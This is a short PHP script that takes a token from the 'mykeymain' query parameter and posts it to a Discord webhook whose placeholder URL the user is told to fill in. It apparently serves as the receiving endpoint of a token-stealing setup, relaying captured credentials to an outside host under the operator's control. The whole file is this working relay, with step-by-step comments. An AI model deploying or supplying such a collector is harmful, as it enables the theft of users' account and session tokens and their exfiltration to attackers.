<?php
// Step 1: Get the token from the query parameter
if (isset($_GET['mykeymain'])) {
    $token = $_GET['mykeymain'];

    // Step 2: Define the Discord webhook URL
    $webhookUrl = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN'; // Replace with your actual webhook URL

    // Step 3: Prepare the payload to send to the webhook
    $payload = json_encode(['content' => "Token: $token"]);

    // Step 4: Send the token to the Discord webhook
    $ch = curl_init($webhookUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);

    $response = curl_exec($ch);
    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    // Check if the request was successful
    if ($httpcode >= 200 && $httpcode < 300) {
        echo "Token sent successfully to Discord webhook.";
    } else {
        echo "Failed to send token to Discord webhook. HTTP status code: $httpcode";
    }
} else {
    // Respond with an error if no token is found
    http_response_code(400);
    echo "No token found in the request.";
}
?>
